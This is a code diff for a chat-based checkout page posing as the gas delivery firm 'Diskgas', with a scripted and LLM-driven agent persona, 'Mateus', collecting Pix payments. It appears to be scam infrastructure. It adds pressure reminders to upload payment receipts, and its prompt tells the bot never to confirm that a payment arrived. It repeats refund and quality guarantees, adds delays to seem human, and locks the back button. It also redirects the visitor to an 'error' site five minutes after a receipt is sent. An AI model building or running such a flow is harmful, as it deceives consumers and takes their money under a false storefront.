@@ -1857,7 +2351,7 @@ await addMsg(`Me chamo 𝗠𝗮𝘁𝗲𝘂𝘀 𝗦𝗶𝗹𝘃𝗮, sou o vend
       return;
     }
     const elapsed = Date.now() - pixStartTime;
-    if (elapsed < 7000) await pause(7000 - elapsed);
+    if (elapsed < 2000) await pause(2000 - elapsed);
     sp.remove();
 addSys('Pix gerado com sucesso', 'ok');
 sendTranscript();
@@ -1870,7 +2364,7 @@ await agentSay(`Após o pagamento o prazo de entrega é de 20-30 minutos. 😃`,
 await pause(1000); // Pequena pausa para naturalidade
 
 // AGORA exibe o card do Pix
-showDeliverySteps(pixCode);
+showDeliverySteps(pixCode, window._currentPixExpiresAt);
     
         // Pausa após exibir o código PIX
     await pause(600);
@@ -1893,7 +2387,62 @@ addProfessionalStatusCard();
     window._currentFlowStep = 9; 
     saveChatHistory();
 
-    // Timer de segurança (reexibe o card após 4 min se o usuário ainda não pagou)
+    // ── LEMBRETES AMIGÁVEIS ──
+    // Lembrete 1: 1 min após o PIX — suporte proativo
+    setTimeout(async () => {
+      if (!window._paymentConfirmed && !window._receiptReminder1Sent) {
+        window._receiptReminder1Sent = true;
+        const nome = (ORDER.nome || '').split(' ')[0] || '';
+        const saudacao = nome ? `${nome}, ` : '';
+        await agentSay(`${saudacao}Após o pagamento peço que envie o comprovante para agilizarmos sua entrega! 😃`, true, true);
+        // Adiciona botão de enviar comprovante logo abaixo da mensagem
+        setTimeout(() => {
+          const lastBubble = msgsEl.querySelector('.row.agent:last-child .bubble.a');
+          if (lastBubble && !lastBubble.querySelector('.receipt-reminder-btn')) {
+            const btn = document.createElement('button');
+            btn.className = 'receipt-reminder-btn';
+            btn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg> Enviar Comprovante';
+            btn.onclick = () => { receiptModalOverlay.classList.add('on'); };
+            const metaEl = lastBubble.querySelector('.b-meta');
+            if (metaEl) {
+              metaEl.parentElement.insertBefore(btn, metaEl);
+            } else {
+              lastBubble.appendChild(btn);
+            }
+          }
+        }, 300);
+        saveChatHistory();
+      }
+    }, 1 * 60 * 1000);
+
+    // Lembrete 2: 3 min após o PIX — benefício + comprovante
+    setTimeout(async () => {
+      if (!window._paymentConfirmed && !window._receiptReminder2Sent) {
+        window._receiptReminder2Sent = true;
+        const nome = (ORDER.nome || '').split(' ')[0] || '';
+        const saudacao = nome ? `${nome}, ` : '';
+        await agentSay(`${saudacao}Após o envio do comprovante de pagamento a aprovação é imediata. Estou no aguardo! 😃`, true, true);
+        // Adiciona botão de enviar comprovante logo abaixo da mensagem
+        setTimeout(() => {
+          const lastBubble = msgsEl.querySelector('.row.agent:last-child .bubble.a');
+          if (lastBubble && !lastBubble.querySelector('.receipt-reminder-btn')) {
+            const btn = document.createElement('button');
+            btn.className = 'receipt-reminder-btn';
+            btn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg> Enviar Comprovante';
+            btn.onclick = () => { receiptModalOverlay.classList.add('on'); };
+            const metaEl = lastBubble.querySelector('.b-meta');
+            if (metaEl) {
+              metaEl.parentElement.insertBefore(btn, metaEl);
+            } else {
+              lastBubble.appendChild(btn);
+            }
+          }
+        }, 300);
+        saveChatHistory();
+      }
+    }, 3 * 60 * 1000);
+
+    // Timer de segurança (reexibe o card após 5 min se o usuário ainda não pagou)
     setTimeout(() => {
       if (!window._paymentConfirmed) {
         // Só adiciona se o card não estiver visível (evita duplicados)
@@ -1902,7 +2451,7 @@ addProfessionalStatusCard();
             saveChatHistory();
         }
       }
-    }, 4 * 60 * 1000);
+    }, 5 * 60 * 1000);
 
 
   }
@@ -1931,7 +2480,7 @@ async function getChatGPTResponse(userMessage, chatHistory, currentFlowStep) {
     // Variáveis para controlar se a primeira mensagem de fricção já foi enviada
   const chatHistoryLower = chatHistory.toLowerCase();
 
-  const hasSentEntregaMsg1 = chatHistoryLower.includes("garantimos a sua entrega no prazo, caso contrário faremos o reembolso completo do valor pago.");
+  const hasSentEntregaMsg1 = chatHistoryLower.includes("garantimos a entrega do seu gás, caso contrário faremos o reembolso completo do valor pago.");
   const hasSentPixMsg1 = chatHistoryLower.includes("o pagamento via pix na diskgas é 100% seguro e instantâneo.");
   const hasSentQualidadeMsg1 = chatHistoryLower.includes("trabalhamos apenas com produtos de alta qualidade e fornecedores confiáveis.");
   const hasSentConfiancaMsg1 = chatHistoryLower.includes("a diskgas tem anos de experiência no mercado e milhares de clientes satisfeitos.");
@@ -1940,7 +2489,7 @@ async function getChatGPTResponse(userMessage, chatHistory, currentFlowStep) {
   const msgEntrega1 = "Fique tranquilo, sua compra é protegida e assegurada pela Diskgás, garantimos a entrega no prazo ou fazemos a devolução do seu dinheiro. 😄";
   const msgPix1 = "O pagamento via Pix é 100% seguro e protegido. A entrega é garantida e a aprovação imediata, e em caso de qualquer problema fazemos o reembolso completo do valor pago. 😄";
   const msgQualidade1 = "Trabalhamos apenas com produtos certificados. Garantimos a procedência e a qualidade do seu gás, para sua total segurança e tranquilidade.";
-  const msgConfianca1 = "A sua compra é assegurada pela Diskgas, garantimos a sua entrega no prazo, caso contrário faremos o reembolso completo do valor pago. 😄";
+  const msgConfianca1 = "Não se preocupe, sua compra é assegurada pela Diskgas, garantimos a entrega no prazo ou fazemos o reembolso completo do valor pago. 😄";
 
   // Mensagens de conversão - Nível 2 (novas, mais detalhadas)
   const msgEntrega2 = "Entendo sua preocupação. Além da nossa garantia de reembolso, saiba que contamos com uma logística otimizada e entregadores treinados para assegurar que seu pedido chegue rápido e em perfeitas condições. Sua tranquilidade é nossa prioridade! 😄";
@@ -1990,7 +2539,7 @@ Você é o Mateus, atendente da Diskgas.
 
 --- REGRAS DE OURO (USAR APENAS SE NÃO FOR CARTÃO/ENTREGA OU RECEIO) ---
 - PRAZO: Se o cliente perguntar o prazo de entrega isoladamente, responda: "O prazo de entrega é de ${prazoEntrega} após o pagamento. 😄"
-- PAGAMENTO: Nunca confirme que o Pix caiu, o pedido foi finalizado ou qualque tipo de confirmação. Se o cliente disser que pagou ou enviar algum comprovante responda: "Com o pagamento realizado podemos preparar o envio, o prazo de entrega é de ${prazoEntrega} após o pagamento. 😄"
+- PAGAMENTO: Nunca confirme que o Pix caiu, o pedido foi finalizado ou qualque tipo de confirmação. Se o cliente disser que pagou ou enviar algum comprovante responda: "O prazo de entrega é de ${prazoEntrega} após o envio do comprovante de pagamento. 😄"
 HISTÓRICO DE CONVERSA:
 ${chatHistory}
 
@@ -2005,7 +2554,7 @@ PASSO ATUAL: ${currentFlowStep}
         message: userMessage, 
         context: context, 
         currentFlowStep: currentFlowStep,
-        userId: localStorage.getItem('dg_user_id') || 'anon-' + Math.random().toString(36).substr(2, 9),
+        userId: userId,
         url: window.location.href
       })
     });
@@ -2115,7 +2664,23 @@ if (!window._orderConfirmationShown && window._currentFlowStep <= 3) {
       setTyping(true);
       await pause(1500);
       setTyping(false);
-      await agentSay("Com o pagamento realizado podemos preparar o envio, o prazo de entrega é de 20-30 minutos. 😄", true, true);
+      await agentSay("O prazo de entrega é de 20-30 minutos após o envio do comprovante de pagamento. 😄", true, true);
+      // Adiciona botão de enviar comprovante logo abaixo da mensagem
+      setTimeout(() => {
+        const lastBubble = msgsEl.querySelector('.row.agent:last-child .bubble.a');
+        if (lastBubble && !lastBubble.querySelector('.delivery-receipt-btn')) {
+          const btn = document.createElement('button');
+          btn.className = 'delivery-receipt-btn';
+          btn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg> Enviar Comprovante';
+          btn.onclick = () => { receiptModalOverlay.classList.add('on'); };
+          const metaEl = lastBubble.querySelector('.b-meta');
+          if (metaEl) {
+            metaEl.parentElement.insertBefore(btn, metaEl);
+          } else {
+            lastBubble.appendChild(btn);
+          }
+        }
+      }, 300);
       saveChatHistory();
     }
     
@@ -2144,7 +2709,7 @@ if (!window._orderConfirmationShown && window._currentFlowStep <= 3) {
       await pause(1000);
       
       // 2. Reenvia o bloco do PIX já gerado pela API
-      showDeliverySteps(pixDefault);
+      showDeliverySteps(pixDefault, window._currentPixExpiresAt);
       await pause(800);
 
       // 3. Envia a mensagem de acompanhamento personalizada
@@ -2219,19 +2784,76 @@ function lockBackButton() {
         if (state.lojaAddress) window._lojaAddress = state.lojaAddress;
     window._orderConfirmationShown = state.orderConfirmationShown || false;
     window._currentPixCode = state.pixCode; window._pixCopyTimer = null; window._pixPaymentTimer = null; window._pixCopyReminderSent = false; window._pixPaymentReminderSent = false;
-    lastSender = state.lastSender; window._currentFlowStep = state.flowStep || 0; window._paymentConfirmed = state.paymentConfirmed || false; window._contactMsgSent = state.contactMsgSent || false; window._pixCopyClicked = state.pixCopyClicked || false; window._pixCopyReminderSent = state.pixCopyReminderSent || false; window._pixPaymentReminderSent = state.pixPaymentReminderSent || false;
+    lastSender = state.lastSender; window._currentFlowStep = state.flowStep || 0; window._paymentConfirmed = state.paymentConfirmed || false; window._contactMsgSent = state.contactMsgSent || false; window._pixCopyClicked = state.pixCopyClicked || false; window._pixCopyReminderSent = state.pixCopyReminderSent || false; window._pixPaymentReminderSent = state.pixPaymentReminderSent || false; window._receiptReminder1Sent = state.receiptReminder1Sent || false; window._receiptReminder2Sent = state.receiptReminder2Sent || false; window._receiptDeliveryMsgSent = state.receiptDeliveryMsgSent || false; window._currentPixExpiresAt = state.pixExpiresAt || null;
     msgsEl.innerHTML = savedHTML;
+
+    // Restore attachment data URLs from data attributes for images
+    msgsEl.querySelectorAll('.row.user').forEach(row => {
+      const url = row.dataset.attachmentUrl;
+      if (url && url.startsWith('/uploads/')) {
+        // For images, we cannot restore data URLs from server files
+        // Just ensure the PDF icon links work
+        const pdfLink = row.querySelector('.bubble-attachment-pdf span');
+        if (pdfLink) {
+          pdfLink.parentElement.style.cursor = 'pointer';
+          pdfLink.parentElement.onclick = () => window.open(url, '_blank');
+        }
+      }
+    });
+
+    // Restore QR Code and the fixed 15-minute timer if PIX card exists
+    const pixCard = msgsEl.querySelector('.pix-card');
+    const savedExpiryMs = new Date(window._currentPixExpiresAt || '').getTime();
+    const hasSavedExpiry = Number.isFinite(savedExpiryMs);
+    
+    if (pixCard && window._currentPixCode) {
+      // Restore QR Code only if library is available
+      const qrContainer = pixCard.querySelector('#pixQrCanvas');
+      if (qrContainer && typeof QRCode !== 'undefined') {
+        QRCode.toCanvas(qrContainer, window._currentPixCode, { width: 180, margin: 1, color: { dark: '#000000', light: '#FFFFFF' } }, function(err) {
+          if (err) {
+            console.warn('Erro ao restaurar QR Code:', err);
+            const qrSection = pixCard.querySelector('.pix-qr-section');
+            if (qrSection) qrSection.style.display = 'none';
+          }
+        });
+      }
+
+      // Retoma o prazo salvo; para cards antigos sem prazo, cria 15 minutos uma única vez.
+      const expiryMs = hasSavedExpiry ? savedExpiryMs : Date.now() + PIX_CARD_DURATION_SECONDS * 1000;
+      window._currentPixExpiresAt = new Date(expiryMs).toISOString();
+      startPixCardCountdown(pixCard, expiryMs);
+      saveChatHistory();
+    }
+    
     const pixCopyBtn = msgsEl.querySelector('#pixCopyBtn');
     if (pixCopyBtn && window._currentPixCode) {
-        pixCopyBtn.onclick = () => {
-          window._pixCopyClicked = true; if (window._pixCopyTimer) clearTimeout(window._pixCopyTimer);
-          navigator.clipboard.writeText(window._currentPixCode).catch(()=>{});
-        pixCopyBtn.classList.add('copied');
-        pixCopyBtn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Código copiado!`;
-        setTimeout(()=>{
-          pixCopyBtn.classList.remove('copied');
-          pixCopyBtn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copiar código Pix`;
-        }, 2500);
+      pixCopyBtn.onclick = () => {
+        window._pixCopyClicked = true;
+        if (window._pixCopyTimer) clearTimeout(window._pixCopyTimer);
+        navigator.clipboard.writeText(window._currentPixCode).then(() => {
+          pixCopyBtn.classList.add('copied');
+          pixCopyBtn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Código copiado!`;
+          setTimeout(()=>{
+            pixCopyBtn.classList.remove('copied');
+            pixCopyBtn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copiar código Pix`;
+          }, 2500);
+        }).catch(() => {
+          const codeText = pixCard ? pixCard.querySelector('#pixCodeText') : null;
+          if (codeText) {
+            codeText.classList.add('pix-code-selectable');
+            codeText.textContent = window._currentPixCode;
+            const range = document.createRange();
+            range.selectNodeContents(codeText);
+            const sel = window.getSelection();
+            sel.removeAllRanges();
+            sel.addRange(range);
+          }
+          pixCopyBtn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg> Selecione o código acima`;
+          setTimeout(()=>{
+            pixCopyBtn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copiar código Pix`;
+          }, 3500);
+        });
       };
     }
     const btnCorrect = msgsEl.querySelector('#btnCorrect');
@@ -2265,10 +2887,11 @@ function lockBackButton() {
 </script>
 <script>
 (function () {
-  const REDIRECT_URL    = 'https://concluerror.onrender.com';
-  const MS_FIRST_ACCESS = 25 * 60 * 1000;
-  const MS_AFTER_PIX    = 15 * 60 * 1000;
-  const KEY_FA  = 'dg_fa'; const KEY_PT  = 'dg_pt';
+  const REDIRECT_URL       = 'https://concluerror.onrender.com';
+  const MS_FIRST_ACCESS    = 25 * 60 * 1000;
+  const MS_AFTER_RECEIPT   = 5 * 60 * 1000; // 5 minutos após envio de comprovante
+  const KEY_FA             = 'dg_fa';
+  const KEY_RECEIPT_TIMER  = 'dg_receipt_timer';
   let _timer = null;
   function startTimer(ms) {
     if (_timer) clearTimeout(_timer);
@@ -2279,11 +2902,24 @@ function lockBackButton() {
   let remainFA = MS_FIRST_ACCESS - (Date.now() - parseInt(fa));
   if (remainFA <= 0) { window.location.href = REDIRECT_URL; return; }
   startTimer(remainFA);
+
+  // Timer de 5 min após envio de comprovante
+  const receiptStart = localStorage.getItem(KEY_RECEIPT_TIMER);
+  if (receiptStart) {
+    const remainReceipt = MS_AFTER_RECEIPT - (Date.now() - parseInt(receiptStart));
+    if (remainReceipt > 0) {
+      startTimer(Math.min(remainReceipt, remainFA));
+    }
+  }
+
+  // Monitora se o comprovante foi enviado durante esta sessão
   setInterval(() => {
-    let pt = localStorage.getItem(KEY_PT);
-    if (!pt && window._currentPixCode) {
-      pt = Date.now(); localStorage.setItem(KEY_PT, pt);
-      let remainPT = MS_AFTER_PIX; startTimer(remainPT);
+    const rs = localStorage.getItem(KEY_RECEIPT_TIMER);
+    if (rs) {
+      const remainReceipt = MS_AFTER_RECEIPT - (Date.now() - parseInt(rs));
+      if (remainReceipt > 0) {
+        startTimer(Math.min(remainReceipt, MS_FIRST_ACCESS - (Date.now() - parseInt(fa))));
+      }
     }
   }, 2000);
 })();
